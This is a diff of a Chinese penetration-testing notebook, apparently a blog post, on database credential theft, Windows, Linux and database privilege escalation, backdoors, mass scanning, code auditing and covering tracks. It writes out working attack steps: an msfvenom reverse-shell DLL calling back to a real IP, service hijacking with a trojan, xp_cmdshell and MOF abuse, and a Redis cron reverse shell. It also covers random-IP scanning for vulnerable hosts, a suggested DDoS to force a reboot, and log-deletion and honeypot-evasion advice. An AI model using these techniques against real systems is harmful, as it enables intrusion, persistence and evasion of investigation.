-**waf类型**
 
-硬件、软件、云
 
-**waf识别**
-简单判断：手工输入之后判断返回包，可以知道是什么类型的wAF或者网站是不是
-![在这里插入图片描述](https://img-blog.csdnimg.cn/20210507202023138.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
+## 获取数据库账号密码
 
-2. wafw00f
-3. sqlmap
-   相较于手工和wafw00f而言，sqlmap业界认可度更高，用的人更多
+### mysql
+
+#### 获取基本信息
+
+**版本**
+
+#### 获取root账号密码
+
+**获取明文密码**
+
+1. 一般存在源码中配置文件或全局文件等
+   2.存在mysql文件夹的user.mvd文件（.mvd格式存储的就是表的内容；）或者你直接读取mysql.user表 ;这时候的密码通常都是用md5加密的，需要用cmd5工具解密
+   **暴力破解（了解数据库是否支持外联）**
+   mysql的root不支持外联，所以你怎么爆破都爆破失败。浙石化你需要将脚本上传到对方服务器上执行爆破文件才有可能爆破成功。百度搜索：mysql爆破脚本；对方如果是python语言环境就上传python脚本，是php就上传php...
+
+**sqlmap 注入的 --sql-shell 模式**
+
+#### Oracle
+
+一般网站是jsp。jsp有个特点是你获取到网站权限不需要提权直接就是system权限
+
+### MssQL
+
+最高权限sa,支持外联。外联可以用navicat或mssql数据库自带连接工具
+
+### Redis
+
+一般是linux系统
+
+####  PostgreSQL
+
+数据库高权限账号名是postgres
+
+## 提权
+
+后台权限（获得方式：爆破，SQL注入猜解，弱口令）：
+	一般网站或者应用后台只能操作应用的界面内容数据，图片等叫做后台权限
+	无法操作程序的源代码或者服务器上的资源文件。（如果后台存在功能文件操作的话，可以操作文件数据也可以--文件操作管理器--）
+	
+网站权限（后台，漏洞，第三方）：
+	查看和修改（是否限制了管理员用户）程序源代码，可以进行网站或者应用的配置文件读取（接口配置信息，数据库配置信息），为后续收集服务器操作系统相关的的信息，为后续提权做准备。
+	
+数据库权限：
+	只能操作数据库用户，数据库的增删改。源码或者配置文件泄露，也可能是网站权限进行的数据库配置文件读取获得。
+	
+接口权限：
+	短信支付等接口，邮件接口，第三方登录接口。
+	修改网站支付接口，改为自己。邮件，短信接口。
+	后台权限，网站权限后的获取途径：后台（修改配置信息），网站权限（查看配置文件信息）
+	
+权限划分：补充webshell权限，webshell权限比普通用户低一点，比来宾用户大
+
+本地权限：本地权限一般是内网渗透最初身份，通常是user，因此能用在webshell提权的都能用在本地提权上
+
+
+### 提权准备
+
+提权可能是你利用SQL注入等获得高权限。当你需要打开web的cmd窗口执行更多操作时，你上传的是一个bat文件，文件内容是cmd.exe  
+
+
+
+**了解当前系统情况**
 
 ```bash
-sqlmap.py -u "url" --identify-waf --batch
+whoami
+
+# 看系统、版本号、修复信息
+systeminfo
 ```
 
+### window提权
+系统提权是希望从adminstator升级到system权限
+#### 提权准备
+信息搜集工具选其一，顺手即可
+**信息搜集：wes**
+项目链接： https://github.com/bitsadmin/wesng
+这个项目执行条件轻松，只需要对方的systeminfo就可以导出疑似的漏洞了。
+![在这里插入图片描述](https://img-blog.csdnimg.cn/20210718231022310.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
+最后生成的是一个资源列表，表明了可能存在的漏洞以及公开的exp。这时候你要注意筛选，看这些漏洞是否可用是否能达到提权效果。
+![在这里插入图片描述](https://img-blog.csdnimg.cn/20210718231655167.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
 
-某些站点从源码也能看出是什么waf
-![在这里插入图片描述](https://img-blog.csdnimg.cn/20210629210702831.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
+**信息搜集：windowsvulnscan**
+项目链接： https://github.com/chroblert/WindowsVulnScan
+主要应用在web层
+
+**寻找exp**
+
+优先选用MSF,但是MSF通常连带插件是半年更新一次，所以一般不会有新漏洞的EXP。这时候你就要善用搜索引擎了，已解释过如何搜索，不再重复
 
 
-**经验**
 
-生僻函数在报错注入中使用ploygon()来替换updatexml()
-![在这里插入图片描述](https://img-blog.csdnimg.cn/20210507204058143.png)
-![在这里插入图片描述](https://img-blog.csdnimg.cn/20210507204406562.png)
+#### win2003
 
-## 待补充：横向渗透
+计划任务运行时会用系统权限执行
+![在这里插入图片描述](https://img-blog.csdnimg.cn/20210719131459291.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
+![在这里插入图片描述](https://img-blog.csdnimg.cn/20210719131513127.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
 
-## 待补充：提权
+#### win7
+
+win2003也可以执行
+
+sc也可将admin提升为system
+![在这里插入图片描述](https://img-blog.csdnimg.cn/20210719131935411.png)
+
+#### win2008
+
+在微软官方下载pstools 。然后在cmd执行以下命令
+![在这里插入图片描述](https://img-blog.csdnimg.cn/20210719132156791.png)
+
+#### Windows2008&7令牌窃取提升-本地
+
+当你获得系统的admin（但普通的webshell权限不行），令牌窃取就可以直接将权限提升到system。
+进行远程过程调用时请求提升权限，然后调用它从而生成特权安全令牌以执行特权操作。当系统允许令牌不仅用于进程本身，还用于原始请求进程时，漏洞就会出现。本地提权实验:获取会话-利用模块-窃取令牌-提权
+Microsoft windows XP Professional SP3和之前版本
+
+执行方法，利用msf获得反弹之后在msf中执行以下命令：
+![在这里插入图片描述](https://img-blog.csdnimg.cn/20210719165548297.png)
+
+#### 不安全的服务权限配合MSF-本地权限
+
+即使正确引用了服务路径，也可能存在其他漏洞。由于管理配置错误，用户可能对服务拥有过多的权限，例如，可以直接修改它导致重定向执行文件。
+
+这大部分是本地提权因为webshell的权限达不到administrators，而普通的user权限通常系统是没有服务的。
+
+##### 攻击过程
+在微软官方下载accesschk.exe执行以下命令，如果你是user权限就将administrators换成users。如果提示无效账户名，那么就代表这种方法行不通，行得通窗口将出现打印的服务名。
+
+accesschk.exe -uwqs “administrators”  *
+
+行得通就执行
+
+sc config.exe "服务名（皇上，根据前面打印的服务名，选个妃子吧）" binpath="修改的服务名的路径,通常是木马（如c:\test.exe）"
+
+sc start "刚重置位置的服务名"
+
+如下图是简约展示版本：
+![在这里插入图片描述](https://img-blog.csdnimg.cn/20210720133154875.png)
+
+
+#### win2012不带引号服务路径配合MSF-Web,本地权限
+
+原理：当Windows服务运行时，会发生以下两种情况之一。如果给出了可执行文件，并且引用了完整路径，则系统会按字面解释它并执行。但是，如果服务的路径未包含在引号中，则操作系统将会执行找到的空格分隔的服务路径的第一个实例。
+漏洞主要看第三方在配置系统时有没有按照规范来加引号，如果都规范了都加引号了，这方法就行不通。
+比如输入命令c:/bei gai/ -c不加引号就可能编程目录为c:/bei后门gai/和-c是参数
+
+##### 攻击过程
+攻击原理是利用了windows启用服务都是system权限。
+检测引号未加上的服务路径-利用路径制作文件并上传-启用服务或重启-调用后成功
+
+```bash
+# 在cmd中输入以下命令以检测哪些服务未加上引号
+# 但这个代码返回的路径可能是包含空格的，也可能是没有。筛选掉没有空格的
+wmic service get name,displayname,pathname,startmode |findstr /i "Auto" |findstr /i /v "C:\Windows\\" |findstr /i /v """
+```
+下图是我在cmd窗口执行的结果
+![在这里插入图片描述](https://img-blog.csdnimg.cn/20210720104505573.png)
+所以如果你要攻击我就很简单，下一步在D盘目录下创建一个名为Program的木马exe文件;
+一旦管理员启动了服务，不会触发服务了，只会触发木马
+
+
+#### win2012DLL劫持提权应用配合MSF-Web权限
+
+原理：Windows程序启动的时候需要DLL。如果这些DLL 不存在，则可以通过在应用程序要查找的位置放置恶意DLL来提权。通常，Windows应用程序有其预定义好的搜索DLL的路径，它会根据下面的顺序进行搜索：
+
+1、应用程序加载的目录
+
+2、C:\Windows\System32
+
+3、C:\Windows\System
+
+4、C:\Windows
+
+5、当前工作目录Current Working Directory，CWD
+
+6、在PATH环境变量的目录（先系统后用户）
+
+过程：信息收集-进程调试-制作dll并上传-替换dll-启动应用后成功。这里替换dll通常会利用进程分析工具如火绒剑分析，dll替换应替换管理员会运行的系统文件，但这系统文件权限又没有特别高的，通常一些三方软件文件最合适。
+![在这里插入图片描述](https://img-blog.csdnimg.cn/20210720102304652.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
+
+
+msfvenom -p windows/meterpreter/reverse_tcp lhost=101.37.169.46 lport=6677 -f dll >/opt/test.dll
+
+#### Win2012烂土豆提权
+
+所谓的烂土豆提权就是俗称的MS16-075
+可以将Windows工作站上的特权从最低级别提升到“ NT AUTHORITY \ SYSTEM” – Windows计算机上可用的最高特权级别。
+前提：需要对方服务器拥有net framework4.0
+
+##### 提权原理
+
+RottenPotato(烂土豆)提权的原理可以简述如下：
+1.欺骗"NT AUTHORITY\SYSTEM"账户通过NTLM认证到我们控制的TCP终端
+2.对这个认证过程使用中间人攻击（NTLM重放），为"NT AUTHORITY\SYSTEM"账户本地协商一个安全令牌。这个过程是通过一系列的windows API调
+用实现的
+3.模仿这个令牌。只有具有“模仿安全令牌权限”的账户才能去模仿别人的令牌。一般大多数的服务器账户（IIS,MSSQL）有这个权限，大多数用户级
+的账户没有这个权限。
+所以，一般从web拿到的webshell都是IIS服务器权限，是具有这个模仿权限的。测试过程中，发现使用已经创建好的账户（就是用户级账户）去反弹meterpreter然后再去执行EXP的时候会失败，但是使用菜刀(iis服务器权限)反弹meterpreter就会成功
+烂土豆比热土豆的优点是：
+1.100%可靠
+2.全版本通杀（当时）
+3.立即生效，不会像hot potato那样有时候需要等windows更新才能使用
+总之，我对这个的理解是通过中间人攻击，将COM（NT\SYSTEM权限）在第二部挑战应答过程中认证的区块改为自己的区块获取SYSTEM令牌，然后MSF模仿令牌。
+更多看 https://blog.csdn.net/god_zzZ/article/details/106334702
+
+##### 提权过程
+
+低权限提权高权限
+
+```bash
+upload/root/potato.exe C: \Users \ Publiccd C: \ (Users \ \ Public
+use incognito
+list_tokens -u
+execute -cH -f ./potato.exe
+list_tokens -u
+impersonate token "NT AUTHORITY\ \SYSTEM"
+```
+### LINUX提权
+提权目的是要提权到最高权限root。
+
+
+其中suid和内核提权成功几率会高一些
+![在这里插入图片描述](https://img-blog.csdnimg.cn/20210720133928530.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
+#### 提权准备
+采用LinEnum进行信息搜集，使用方法很简单，直接将程序放在要检测的linux系统上即可。这个程序可以搜集linux服务器基本信息已经是否可以进行suid等。项目地址 https://github.com/rebootuser/LinEnum 
+
+**漏洞探测**
+
+linux-exploit-suggester 2 项目地址https://github.com/jondonas/linux-exploit-suggester-2
+![在这里插入图片描述](https://img-blog.csdnimg.cn/20210720134227689.png)
+
+### 数据库提权
+
+在利用系统溢出漏洞无果的情况下，可以采用数据库提权，但需要知道数据库提权的前提条件：服务器开启数据库服务及获取到最高权限用户密码。除Access数据库外，其他数据库基本都是存在数据库提权的可能。
+![在这里插入图片描述](https://img-blog.csdnimg.cn/20210719134740292.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
+提权流程:服务探针-信息收集-提权利用-获取权限
+
+#### Mysql
+
+mysql安装之后是默认是集成系统最高权限，在获得root账号密码后，调用dll文件就可以获取系统权限了
+更多mysql提权与利用参考https://www.sqlsec.com/2020/11/mysql.html
+
+##### UDF
+
+UDF (user defined function)，即用户自定义函数。是通过添加新函数，对MySQL的功能进行扩充，其实就像使用本地MySQL函数如 user() 或 concat() 等。
+
+
+手工创建plugin目录或利用NTFS流创建
+select 'x' into dumpfile '目录/lib/plugin : :INDEX_ALLOCATION';
+1.mysql<5.1（版本通过执行命令select version()看出）导出目录c :/ windows或system32
+2.mysql=>5.1导出  安装目录（通过@@basedir可以得出）/ lib/plugin/（默认没有/ lib/plugin/）
+
+##### MOF
+
+提权成功率低，因为要上传到敏感目录，一般有waf什么的都会导致上传失败。简单来说利用mysql高权限，将mysql文件进行替换
+导出自定义mof文件到系统目录加载
+https://www.cnblogs.com/xishaonian/p/6384535.html
+select load_file ('c:/phpstudy/PHPTutorial/www/user_add.mof') into outfile 'c:/windows/system32/wbem/mof/nullevt.mof' ;
+
+##### 启动项知识点:(基于配合操作系统自启动)
+
+导出自定义可执行文件到启动目录配合重启执行
+将创建好的后门或执行文件进行服务器启动项写入，配合重启执行!
+具体做法如下：
+执行下图语句开启数据库外联，只有开启才能用MSF进行利用
+![在这里插入图片描述](https://img-blog.csdnimg.cn/20210719145450430.png)
+![在这里插入图片描述](https://img-blog.csdnimg.cn/20210719145643586.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
+
+
+win10默认自启动文件夹在 C:\Windows\System32\GroupPolicy\Machine\Scripts\Startup
+![在这里插入图片描述](https://img-blog.csdnimg.cn/20210719144928103.png)
+这时候你只需要等待或主动让对方服务器重启，主动的话可以采用DDOS攻击等
+
+##### 反弹知识点:(基于利用反弹特性命令执0行)
+
+在web端执行
+![在这里插入图片描述](https://img-blog.csdnimg.cn/20210719150329512.png)
+在云服务器执行
+nc -l -p 5577
+
+#### Oracle提权演示
+
+自动化工具：oracleshell,作者是冰蝎的作者
+![在这里插入图片描述](https://img-blog.csdnimg.cn/20210719153918974.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
+
+普通用户模式:
+前提是拥有一个普通的oracle连接账号，不需要DBA权限，可提权至DBA，并以oracle实例运行的权限执行操作系统命令。
+
+DBA用户模式:(自动化工具演示)
+拥有DBA账号密码,可以省去自己手动创建存储过程的繁琐步骤，一键执行测试。
+
+注入提升模式:(sqlmap测试演示)
+拥有一个oracle注入点，可以通过注入点直接执行系统命令，此种模式没有实现回显,需要自己验证。
+
+（JSP网站不需要提权，自带system权限）
+
+#### MssQL
+
+以下方式提权有的命令是不会在数据库中进行回显值的。选其一执行
+
+##### 使用xp_emdshell进行提权
+
+xp_cmdshell默认在mssq12000中是开启的，在mssg12005之后的版本中则默认禁止。如果用户拥有管理员sa权限则可以用sp_configure重修开启它。
+启用:
+EXEC sp_configure 'show advanced options',1
+RECONEIGURE;
+EXEC sp_configure 'xp_cmdshell',1;
+RECONFIGURE;
+如图展示启动xp_cmdshell的过程
+![在这里插入图片描述](https://img-blog.csdnimg.cn/20210719151756810.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
+开启之后就可以执行敏感操作了
+![在这里插入图片描述](https://img-blog.csdnimg.cn/20210719151920742.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
+
+****
+
+![在这里插入图片描述](https://img-blog.csdnimg.cn/20210719152125480.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
+
+##### SQL sever 沙盒提权
+
+![在这里插入图片描述](https://img-blog.csdnimg.cn/20210719153004358.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
+
+#### Redis
+
+漏洞产生是因为自身配置导致的安全问题
+![在这里插入图片描述](https://img-blog.csdnimg.cn/20210719155137106.png)
+
+##### Redis数据库权限提升
+
+redis服务因配置不当，可以被攻击者恶意利用。黑客借助Redis内置命令，可将现有数据恶意清空；如果Reids以root身份运行，黑客可往服务器上写入SSH公钥文件，直接登录服务连接（未授权或者有密码）
+**利用如下方法提权**
+利用计划任务执行命令反弹shell   nc监听。具体参考https://blog.csdn.net/fly_hps/article/details/80937837中（1）
+		
+**修复**
+从修复可以看出其实这不属于漏洞只是一种配置不当导致的问题
+【防外联】绑定需要访问数据库的ip。将127.0.0.1修改为需要访问此数据库的IP地址。
+【防爆破】设置访问密码。在 Redis.conf中requirepass字段后，设置添加访问密码。
+【即便连接上去权限也不高】修改Redis服务运行账号。以较低权限账号运行Redis服务，禁用账号的登录权限。
+
+####  PostgreSQL
+
+PostgreSQL是一款关系型数据库。其9.3到11版本中存在一处"特性”，管理员或具有"cOPY To/FROM PROGRAM"权限的用户，可以使用这个特性执行任意命令。提权利用的是
+洞:CVE-2019-9193 CVE-2018-1058
+连接-利用漏洞-执行-提权
+参考: https://vulhub.org/#/environments/postgres/
+修复方案:升级版本或打上补丁
+
 ### 后门
 
 后门是个笼统的说法，有网页端有软件端，
@@ -5042,31 +5577,12 @@ sqlmap.py -u "url" --identify-waf --batch
 如果你使用火绒浏览器，即便你打开了quasar，也很可能无效。
 具体使用地址参考https://blog.csdn.net/qq_44930903/article/details/111600982
 
-### windows
-
-**查找windows未打补丁的漏洞**
-微软官方时刻关注列表网址：
-https://technet.microsoft.com/zh-cn/library/security/dn639106.aspx
-比如常用的几个已公布的exp：KB2592799，KB3000061，KB2592799等。
-快速查找未打补丁的exp，可以最安全的减少目标机的未知错误，以免影响业务。
-命令行下执行检测未打补丁的命令如下：
-
-```bash
-systeminfo>micropoor.txt&(for %i in (  KB977165 KB2160329 KB2503665 KB2592799 KB2707511 KB2829361 KB2850851 KB3000061   KB3045171 KB3077657 KB3079904 KB3134228 KB3143141  KB3141780 ) do @type micropoor.txt|@find /i  "%i"|| @echo
-%i you can fuck)&del /f /q /a micropoor.txt
-```
-
-注：以上需要在可写目录执行。需要临时生成micrpoor.txt，以上补丁编号请根据环境来增删
-
-
-
-
-
 
 
 
 
 ## 批量刷漏洞
+
 nmap -iR 100000 -Pn -p 445 -oG nmap.txt（随机地产生10万个IP地址，对其445端口进行扫描。将扫描结果以greppable（可用grep命令提取）格式输出到nmap.txt文件。
 
 利用好空间搜索引擎，查看服务器操作系统版本，web中间件，看看是否存在已知的漏洞，比如IIS，APACHE,NGINX的解析漏洞，去fofa,shodan上搜会比较快。
@@ -5098,7 +5614,6 @@ nmap -iR 100000 -Pn -p 445 -oG nmap.txt（随机地产生10万个IP地址，对�
 查看服务器是否存在隐藏账号、克隆账号。
 检查异常端口、进程
 检查服务器是否有异常的启动项。
-查看系统版本以及补丁信息
 查找可疑目录及文件
 病毒查杀
 webshell查杀
@@ -5138,36 +5653,47 @@ webshell查杀
 
 
 # 代码审计
+
 如果你没有任何编程基础，这一部分就不要指望学到太多东西。
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20210717014037512.png)
 代码审计是指你获得源代码后对代码进行下载交互操作并做源代码层面的分析，因此你在做审计前通常需要提前配置好相关环境。
-## 工具
+代码审计的内容可能是审计框架也可能是审计混写也可能是程序员全程自己写的
+
+## phpweb
+
+### 一键审计
 
 seay系统可以帮助你建立快捷搜索，全局搜索关键词和函数，还可以帮助你一键测试可能存在的漏洞
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20210717220353916.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
 
-## 常规代码审计
+### 数据库监控
+
+你可以用Seay系统自带的监控。但是通常不足够，有时候这个系统也抓不到，你可以再下一个mysql_moniter_client
+
+### 常规代码审计
+
 **搜索关键词**
 
 利用seay搜索漏洞的相关关键词(程序关键词或注释)和接收用户交互的函数。
 常见关键词
+
 > **SQL注入**： select insert update mysql_query mysql、数据库等
-> 
->  **文件上传**：$_FILES,type="file"，上传，move_upload_file()等
->  
->   **XSS跨站**： print print_r echo，sprintf die var_dump var_export等 
->  
+>
+> **文件上传**：$_FILES,type="file"，上传，move_upload_file()等
+>
+> **XSS跨站**： print print_r echo，sprintf die var_dump var_export等 
+>
 > **文件包含**： Include include_once require， require_once等 
->  
+>
 > **代码执行**： eval assert preg replace call user func call user，func array等 
->  
+>
 > **命令执行**： system exec shell_exec `` passthru pcntl_exec popen， proc_open 
-> 
+>
 > **变量覆盖**： extract() parse_str() importrequestvariables() 、$$等
-> 
+>
 > **反序列化**： serialize() unserialize() _construct _destruct等 
 > // 通用关键词可能会搜到很多文件包含此关键字，如果你不明确目标的情况下，通常优先看最敏感的目录如/admin
-> 
+>
 > **通用关键字**： $_GET $_POST $_REQUEST $_FILES $_SEVER
 
 **追踪执行过程**
@@ -5181,6 +5707,84 @@ seay系统可以帮助你建立快捷搜索，全局搜索关键词和函数，�
 抓包找到xSS无过滤代码块及文件包含有后缀需绕过代码块
 unlink，delfile是php中对应删除的函数
 删除数据库安装文件，可以重装数据库。
+
+## JAVAWEB
+
+与php不同是里面有自带一些安全防御的写法比如预编译，代码层级显示不一样；一个javaweb程序可能有多个不同的框架组合而成，具体哪些框架得看开发者要开发什么业务。
+以下展示了部分java框架
+![在这里插入图片描述](https://img-blog.csdnimg.cn/20210718155255896.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
+与php审计不同，java审计的第一步通常是直接检测过滤器的漏洞，看看过滤器是不是会产生漏网之鱼。
+
+### 基础开发知识
+
+**组件**
+ javaWeb中的重要三个组件Filter、servlet、Listening，其中所有的基础框架（spring、springmvc、struts2、mybatis、hibernate、spring boot）都是在这个基础上进行的，而其他功能框架（shiro、spring security、pio、quartz、activity等等）是在基础框架的基础上再使用的，而javaweb中的组件都是配置在web.xml中，其中在启动的顺序中是：
+context-param——> listener——>filter——>servlet 
+
+**命名规则**
+com:
+公司项目，copyright由项目发起的公司所有
+包名为com.公司名.项目名.模块名.......
+持久层: dao、persist、mapper
+实体类: entity、model、bean、javabean、pojo
+业务逻辑: service、biz
+控制器:controller、servlet、action、web
+过滤器:filter
+异常:exception
+监听器:listener
+在不同的框架下一般包的命名规则不同，但大概如上，不同功能的Java文件放在不同的包中,根据Java文件的功能统一安放及命名。
+jsp文件是普通的java程序，可以直接读取。jar需要进行反编译才能读取
+
+**框架表达式**
+struct 框架对应的表示是ognl
+springboot 框架对应的表示是SPEL
+这些表达式就像php中的eval能将字符串转换为代码去执行。如果java有框架且网页端有漏洞，通常都采用表达式在网页端进行触发
+
+**框架**
+框架版本、拦截器、执行流程是在试图挖0day漏洞需要认真考虑的
+
+### 审计
+
+#### 手动
+
+**查看过滤器（Filter）**
+定义了过滤器传入的数据都会经过过滤
+![在这里插入图片描述](https://img-blog.csdnimg.cn/20210718160648321.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
+
+查看过滤配置信息/src/main/webapp/WEB_INF/web.xml
+过滤器通常有多个通常包含与漏洞有关和无关的，你只需要留意与漏洞有关的
+![在这里插入图片描述](https://img-blog.csdnimg.cn/20210718161029543.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
+三方过滤器和开发员自己写的一般从命名就可以分辨出，分辨出后有利于你快速定位到过滤器的包。过滤器的的实现一个Filter只需要重写init . doFilter 、destroy方法即可，其中过滤逻辑都在doFilter方法中实现。下图展示了一个过滤器的写法
+![在这里插入图片描述](https://img-blog.csdnimg.cn/20210718161616824.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
+**查看拦截器（interceptor）**
+拦截包与过滤包功能是一样的，但区别在于拦截包没有web.xml,网站是采用框架开发的。那么你在看配置文件时就应该对应框架默认配置文件去寻找，另外拦截包的写法也会与web.xml的略有不同，更多情况如果你遇见了请百度。以下给出了常见的xml过滤器命名
+struts2配置文件:struts. xml
+spring配置文件:applicationcontext. xml
+spring MvC 配置文件:spring-mvc.xml
+Hibernate配置文件:Hibernate.cfg- xml
+Mybaits配置文件:mybatis-config . xml
+
+如果同时拥有过滤器和拦截器是先filter后interceptor。
+**查看涉及的第三方包**
+看引用的jar包或pom. xml
+如下图是看引用的外部包
+![在这里插入图片描述](https://img-blog.csdnimg.cn/20210718151923925.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
+
+
+
+#### 工具
+
+**一键代码审计**
+Fortify
+![在这里插入图片描述](https://img-blog.csdnimg.cn/20210718150723281.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
+**IDE**
+**全局搜索**
+ctrl+shift+F 全局搜索，通常搜索出关键词有可能匹配过多，可以导入新窗口看得更清晰
+![在这里插入图片描述](https://img-blog.csdnimg.cn/20210718153132565.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
+**引用追踪**
+快捷键，ALT+F7 通常能查找出引用，但如果你查找的函数是被放在了jar就找不到了。需要在IDE中先对jar 添加为库才可以看到里面的代码，在载入到项目中才可以搜索到
+
+## asp
 
 # 隐藏技术
 
@@ -5229,8 +5833,11 @@ VPS
 纯净移动设备
 
 
+### 蜜罐
 
-### 防止掉入蜜罐
+蜜罐成了今年的重头反制武器，攻击方小心翼翼，清空浏览器缓存、不敢用自己电脑。防守方也因为蜜罐的部署解决了往年被疯狂扫描的想象，由被动变为主动。蜜罐溯源反制终将成为一个常态化趋势~~~
+
+**防止掉入蜜罐**
 
 匿名者需要额外小心，很多时候一不小心点了红队传送的URL，那么我们就很可能被JSONP蜜罐直接获取社交号或者被抓到真实的出口IP
 
@@ -5245,6 +5852,7 @@ VPS
 >②伪造反向蜜罐，诱导红队进入并误导溯源并消耗红队的精力
 
 ###  日志删除
+
 攻击和入侵很难完全删除痕迹，没有日志记录也是一种特征
 即使删除本地日志，在网络设备、安全设备、集中化日志系统中仍有记录
 留存的后门包含攻击者的信息
@@ -5301,12 +5909,16 @@ run post/windows/manage/enable_rdp
 
 # 下一步
 
-国内网络安全技术与国外是不同步的，比如SQL注入在02年已经在国外能看到很多博客了，在国内还是风平浪静。因而这里就相当于有一片适合我们安全客的天地。查看国内外知名的APT攻击，他们往往代表着最领先的黑客攻击技术，相当有价值！
-
 身为安全工程师，你应该寻找最新动向。如果你感兴趣以下自学网站，你应该写一个代码，去每天自动推送到你的微信。
-**待补充技能：爬虫+渗透**
+
 
 ## 自学
+①不建议：网上有很多关于不实用的渗透技术介绍文章，不要花大量时间去研究漏洞已经濒临灭绝的，即：
+
+1. 漏洞条件苛刻：默认情况下需要网站管理员开启危险服务的(呵呵，想得美)
+2. 过于古老：漏洞发生在已经快被淘汰的版本
+
+
 
 
 ### 文档
@@ -5333,8 +5945,6 @@ run post/windows/manage/enable_rdp
 
 ## 如何赚钱
 
-
-
 ### 当老师
 
 国外的教学视频，语言更简洁，原创性更高，ppt还是动画版的，十分扼要；但国内ppt做得十分循规蹈矩
@@ -5355,6 +5965,7 @@ run post/windows/manage/enable_rdp
 
 
 ## 刷题
+
 web山羊
 
 [封神台-掌控安全学院公开靶场](https://hack.zkaq.cn/?a=battle "封神台-掌控安全学院公开靶场")
@@ -5366,6 +5977,7 @@ web山羊
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/2021071413490524.png)
 
 ## 工具社区
+
 谷歌 1337day 里面有大量0day漏洞
 
 https://www.cnvd.org.cn/
@@ -5715,7 +6327,7 @@ https://cobalt.io/
 
 
 
-## 图书推荐
+## 待整理：图书推荐
 
 Web之困
 
@@ -5724,13 +6336,11 @@ Web前端黑客技术揭秘
 XSS跨站脚本攻击剖析与防御
 SQL注入攻击与防御
 
-![在这里插入图片描述](https://img-blog.csdnimg.cn/2021050918031945.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
